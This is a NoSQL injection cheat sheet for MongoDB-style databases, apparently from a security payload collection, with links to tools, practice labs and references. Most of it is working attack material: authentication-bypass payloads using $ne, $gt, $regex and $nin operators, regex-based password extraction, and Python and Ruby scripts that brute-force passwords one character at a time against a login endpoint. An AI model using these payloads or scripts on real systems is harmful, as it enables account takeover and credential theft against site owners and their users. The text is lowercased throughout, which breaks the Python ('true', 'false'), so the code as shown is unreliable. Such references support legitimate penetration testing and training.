# nosql injection

> nosql databases provide looser consistency restrictions than traditional sql databases. by requiring fewer relational constraints and consistency checks, nosql databases often offer performance and scaling benefits. yet these databases are still potentially vulnerable to injection attacks, even if they aren't using the traditional sql syntax.


## summary

* [tools](#tools)
* [methodology](#methodology)
    * [authentication bypass](#authentication-bypass)
    * [extract length information](#extract-length-information)
    * [extract data information](#extract-data-information)
* [blind nosql](#blind-nosql)
    * [post with json body](#post-with-json-body)
    * [post with urlencoded body](#post-with-urlencoded-body)
    * [get](#get)
* [labs](#references)
* [references](#references)


## tools

* [codingo/nosqlmap](https://github.com/codingo/nosqlmap) - automated nosql database enumeration and web application exploitation tool
* [digininja/nosqlilab](https://github.com/digininja/nosqlilab) - a lab for playing with nosql injection
* [matrix/burp-nosqliscanner](https://github.com/matrix/burp-nosqliscanner) - this extension provides a way to discover nosql injection vulnerabilities. 


## methodology

### authentication bypass

basic authentication bypass using not equal (`$ne`) or greater (`$gt`)

* in http data
  ```ps1
  username[$ne]=toto&password[$ne]=toto
  login[$regex]=a.*&pass[$ne]=lol
  login[$gt]=admin&login[$lt]=test&pass[$ne]=1
  login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto
  ```

* in json data
  ```json
  {"username": {"$ne": null}, "password": {"$ne": null}}
  {"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
  {"username": {"$gt": undefined}, "password": {"$gt": undefined}}
  {"username": {"$gt":""}, "password": {"$gt":""}}
  ```


### extract length information

inject a payload using the $regex operator. the injection will work when the length is correct.

```ps1
username[$ne]=toto&password[$regex]=.{1}
username[$ne]=toto&password[$regex]=.{3}
```

### extract data information

extract data with "`$regex`" query operator.

* http data
  ```ps1
  username[$ne]=toto&password[$regex]=m.{2}
  username[$ne]=toto&password[$regex]=md.{1}
  username[$ne]=toto&password[$regex]=mdp

  username[$ne]=toto&password[$regex]=m.*
  username[$ne]=toto&password[$regex]=md.*
  ```

* json data
  ```json
  {"username": {"$eq": "admin"}, "password": {"$regex": "^m" }}
  {"username": {"$eq": "admin"}, "password": {"$regex": "^md" }}
  {"username": {"$eq": "admin"}, "password": {"$regex": "^mdp" }}
  ```

extract data with "`$in`" query operator.

```json
{"username":{"$in":["admin", "4dm1n", "admin", "root", "administrator"]},"password":{"$gt":""}}
```


## blind nosql

### post with json body

python script:

```python
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username="admin"
password=""
u="http://example.org/login"
headers={'content-type': 'application/json'}

while true:
    for c in string.printable:
        if c not in ['*','+','.','?','|']:
            payload='{"username": {"$eq": "%s"}, "password": {"$regex": "^%s" }}' % (username, password + c)
            r = requests.post(u, data = payload, headers = headers, verify = false, allow_redirects = false)
            if 'ok' in r.text or r.status_code == 302:
                print("found one more char : %s" % (password+c))
                password += c
```

### post with urlencoded body

python script:

```python
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username="admin"
password=""
u="http://example.org/login"
headers={'content-type': 'application/x-www-form-urlencoded'}

while true:
    for c in string.printable:
        if c not in ['*','+','.','?','|','&','$']:
            payload='user=%s&pass[$regex]=^%s&remember=on' % (username, password + c)
            r = requests.post(u, data = payload, headers = headers, verify = false, allow_redirects = false)
            if r.status_code == 302 and r.headers['location'] == '/dashboard':
                print("found one more char : %s" % (password+c))
                password += c
```

### get

python script:

```python
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username='admin'
password=''
u='http://example.org/login'

while true:
  for c in string.printable:
    if c not in ['*','+','.','?','|', '#', '&', '$']:
      payload=f"?username={username}&password[$regex]=^{password + c}"
      r = requests.get(u + payload)
      if 'yeah' in r.text:
        print(f"found one more char : {password+c}")
        password += c
```

ruby script:

```ruby
require 'httpx'

username = 'admin'
password = ''
url = 'http://example.org/login'
# charset = (?!..?~).to_a # all ascii printable characters
charset = [*'0'..'9',*'a'..'z','-'] # alphanumeric + '-'
get_exclude = ['*','+','.','?','|', '#', '&', '$']
session = httpx.plugin(:persistent)

while true
  charset.each do |c|
    unless get_exclude.include?(c)
      payload = "?username=#{username}&password[$regex]=^#{password + c}"
      res = session.get(url + payload)
      if res.body.to_s.match?('yeah')
        puts "found one more char : #{password + c}"
        password += c
      end
    end
  end
end
```


## labs

* [root me - nosql injection - authentication](https://www.root-me.org/en/challenges/web-server/nosql-injection-authentication)
* [root me - nosql injection - blind](https://www.root-me.org/en/challenges/web-server/nosql-injection-blind)


## references

- [burp-nosqliscanner - matrix - january 30, 2021](https://github.com/matrix/burp-nosqliscanner/blob/main/src/burp/burpextender.java)
- [les nosql injections classique et blind: never trust user input - geluchat - february 22, 2015](https://www.dailysecurity.fr/nosql-injections-classique-blind/)
- [mongodb nosql injection with aggregation pipelines - soroush dalili (@irsdl) - june 23, 2024](https://soroush.me/blog/2024/06/mongodb-nosql-injection-with-aggregation-pipelines/)
- [nosql injection in mongodb - zanon - july 17, 2016](https://zanon.io/posts/nosql-injection-in-mongodb)
- [nosql injection wordlists - cr0hn - may 5, 2021](https://github.com/cr0hn/nosqlinjection_wordlists)
- [testing for nosql injection - owasp - may 2, 2023](https://owasp.org/www-project-web-security-testing-guide/latest/4-web_application_security_testing/07-input_validation_testing/05.6-testing_for_nosql_injection)